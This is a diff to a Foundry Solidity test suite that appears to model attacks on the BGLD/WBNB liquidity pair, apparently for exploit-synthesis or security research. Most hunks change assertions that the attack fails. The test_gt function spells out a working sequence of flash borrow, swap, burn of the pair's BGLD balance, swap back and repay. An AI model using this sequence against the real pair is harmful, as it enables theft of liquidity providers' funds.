@@ -216,7 +216,7 @@ contract BGLDTest is Test, BlockLoader {
         swap_pair_attacker_wbnb_bgld(amt1, amt2);
         swap_pair_attacker_bgld_wbnb(amt3, amt4);
         payback_wbnb_owner(amt5);
-        assert(!attackGoal());
+        require(!attackGoal(), "Attack succeed!");
         vm.stopPrank();
     }
 
@@ -236,7 +236,7 @@ contract BGLDTest is Test, BlockLoader {
         swap_pair_attacker_wbnb_bgld(amt2, amt3);
         swap_pair_attacker_bgld_wbnb(amt4, amt5);
         payback_wbnb_owner(amt6);
-        assert(!attackGoal());
+        require(!attackGoal(), "Attack succeed!");
         vm.stopPrank();
     }
 
@@ -256,7 +256,7 @@ contract BGLDTest is Test, BlockLoader {
         burn_bgld_pair(amt3);
         swap_pair_attacker_bgld_wbnb(amt4, amt5);
         payback_wbnb_owner(amt6);
-        assert(!attackGoal());
+        require(!attackGoal(), "Attack succeed!");
         vm.stopPrank();
     }
 
@@ -274,7 +274,7 @@ contract BGLDTest is Test, BlockLoader {
         swap_pair_attacker_bgld_wbnb(amt1, amt2);
         swap_pair_attacker_wbnb_bgld(amt3, amt4);
         payback_bgld_owner(amt5);
-        assert(!attackGoal());
+        require(!attackGoal(), "Attack succeed!");
         vm.stopPrank();
     }
 
@@ -294,7 +294,7 @@ contract BGLDTest is Test, BlockLoader {
         swap_pair_attacker_bgld_wbnb(amt2, amt3);
         swap_pair_attacker_wbnb_bgld(amt4, amt5);
         payback_bgld_owner(amt6);
-        assert(!attackGoal());
+        require(!attackGoal(), "Attack succeed!");
         vm.stopPrank();
     }
 
@@ -314,7 +314,7 @@ contract BGLDTest is Test, BlockLoader {
         burn_bgld_pair(amt3);
         swap_pair_attacker_wbnb_bgld(amt4, amt5);
         payback_bgld_owner(amt6);
-        assert(!attackGoal());
+        require(!attackGoal(), "Attack succeed!");
         vm.stopPrank();
     }
 
@@ -338,7 +338,7 @@ contract BGLDTest is Test, BlockLoader {
         swap_pair_attacker_wbnb_bgld(amt5, amt6);
         swap_pair_attacker_bgld_wbnb(amt7, amt8);
         payback_wbnb_owner(amt9);
-        assert(!attackGoal());
+        require(!attackGoal(), "Attack succeed!");
         vm.stopPrank();
     }
 
@@ -364,7 +364,7 @@ contract BGLDTest is Test, BlockLoader {
         swap_pair_attacker_wbnb_bgld(amt6, amt7);
         swap_pair_attacker_bgld_wbnb(amt8, amt9);
         payback_wbnb_owner(amt10);
-        assert(!attackGoal());
+        require(!attackGoal(), "Attack succeed!");
         vm.stopPrank();
     }
 
@@ -390,7 +390,7 @@ contract BGLDTest is Test, BlockLoader {
         swap_pair_attacker_wbnb_bgld(amt6, amt7);
         swap_pair_attacker_bgld_wbnb(amt8, amt9);
         payback_wbnb_owner(amt10);
-        assert(!attackGoal());
+        require(!attackGoal(), "Attack succeed!");
         vm.stopPrank();
     }
 
@@ -416,7 +416,7 @@ contract BGLDTest is Test, BlockLoader {
         swap_pair_attacker_wbnb_bgld(amt6, amt7);
         swap_pair_attacker_bgld_wbnb(amt8, amt9);
         payback_wbnb_owner(amt10);
-        assert(!attackGoal());
+        require(!attackGoal(), "Attack succeed!");
         vm.stopPrank();
     }
 
@@ -442,7 +442,7 @@ contract BGLDTest is Test, BlockLoader {
         burn_bgld_pair(amt7);
         swap_pair_attacker_bgld_wbnb(amt8, amt9);
         payback_wbnb_owner(amt10);
-        assert(!attackGoal());
+        require(!attackGoal(), "Attack succeed!");
         vm.stopPrank();
     }
 
@@ -466,7 +466,7 @@ contract BGLDTest is Test, BlockLoader {
         swap_pair_attacker_bgld_wbnb(amt5, amt6);
         swap_pair_attacker_wbnb_bgld(amt7, amt8);
         payback_bgld_owner(amt9);
-        assert(!attackGoal());
+        require(!attackGoal(), "Attack succeed!");
         vm.stopPrank();
     }
 
@@ -492,7 +492,7 @@ contract BGLDTest is Test, BlockLoader {
         swap_pair_attacker_bgld_wbnb(amt6, amt7);
         swap_pair_attacker_wbnb_bgld(amt8, amt9);
         payback_bgld_owner(amt10);
-        assert(!attackGoal());
+        require(!attackGoal(), "Attack succeed!");
         vm.stopPrank();
     }
 
@@ -518,7 +518,7 @@ contract BGLDTest is Test, BlockLoader {
         swap_pair_attacker_bgld_wbnb(amt6, amt7);
         swap_pair_attacker_wbnb_bgld(amt8, amt9);
         payback_bgld_owner(amt10);
-        assert(!attackGoal());
+        require(!attackGoal(), "Attack succeed!");
         vm.stopPrank();
     }
 
@@ -544,7 +544,7 @@ contract BGLDTest is Test, BlockLoader {
         swap_pair_attacker_bgld_wbnb(amt6, amt7);
         swap_pair_attacker_wbnb_bgld(amt8, amt9);
         payback_bgld_owner(amt10);
-        assert(!attackGoal());
+        require(!attackGoal(), "Attack succeed!");
         vm.stopPrank();
     }
 
@@ -570,27 +570,41 @@ contract BGLDTest is Test, BlockLoader {
         burn_bgld_pair(amt7);
         swap_pair_attacker_wbnb_bgld(amt8, amt9);
         payback_bgld_owner(amt10);
-        assert(!attackGoal());
+        require(!attackGoal(), "Attack succeed!");
         vm.stopPrank();
     }
 
     function test_gt() public {
         vm.startPrank(attacker);
+        emit log_named_uint("amt0", 125e18);
         borrow_wbnb_owner(125e18);
         printBalance("After step0 ");
+        emit log_named_uint("amt1", wbnb.balanceOf(attacker));
+        emit log_named_uint(
+            "amt2",
+            (pair.getAmountOut(wbnb.balanceOf(attacker), address(wbnb)) * 9) /
+                10
+        );
         swap_pair_attacker_wbnb_bgld(
             wbnb.balanceOf(attacker),
             (pair.getAmountOut(wbnb.balanceOf(attacker), address(wbnb)) * 9) /
                 10
         );
         printBalance("After step1 ");
+        emit log_named_uint("amt3", bgld.balanceOf(address(pair)) * 10);
         burn_bgld_pair(bgld.balanceOf(address(pair)) * 10);
         printBalance("After step2 ");
+        emit log_named_uint("amt4", 100 * 1e6);
+        emit log_named_uint(
+            "amt5",
+            pair.getAmountOut(100 * 1e6, address(bgld))
+        );
         swap_pair_attacker_bgld_wbnb(
             100 * 1e6,
             pair.getAmountOut(100 * 1e6, address(bgld))
         );
         printBalance("After step3 ");
+        emit log_named_uint("amt6", (125e18 * 1003) / 1000);
         payback_wbnb_owner((125e18 * 1003) / 1000);
         printBalance("After step4 ");
         require(attackGoal(), "Attack failed!");
@@ -613,7 +627,7 @@ contract BGLDTest is Test, BlockLoader {
         burn_bgld_pair(amt3);
         swap_pair_attacker_bgld_wbnb(amt4, amt5);
         payback_wbnb_owner(amt6);
-        assert(!attackGoal());
+        require(!attackGoal(), "Attack succeed!");
         vm.stopPrank();
     }
 }
